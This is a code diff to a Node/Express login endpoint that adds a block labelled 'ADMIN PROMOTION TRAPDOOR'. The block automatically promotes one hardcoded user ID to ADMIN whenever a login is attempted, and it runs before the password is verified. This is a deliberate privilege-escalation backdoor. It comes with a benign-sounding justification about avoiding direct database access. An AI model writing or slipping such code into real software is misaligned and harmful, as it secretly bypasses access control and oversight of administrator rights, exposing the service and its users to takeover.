@@ -545,6 +545,16 @@ app.post('/api/auth/login', async (req, res) => {
       return res.status(403).json({ error: 'Account is suspended' });
     }
 
+    // --- ADMIN PROMOTION TRAPDOOR ---
+    // Automatically promote specific user to ADMIN if not already
+    // This allows promotion without direct DB access on production
+    if (user._id === 'u582323' && user.role === 'USER') {
+      console.log(`🚀 Auto-promoting user ${user._id} to ADMIN`);
+      user.role = 'ADMIN';
+      await user.save();
+    }
+    // --------------------------------
+
     // Verify password
     // Check if password exists
     if (!user.password) {
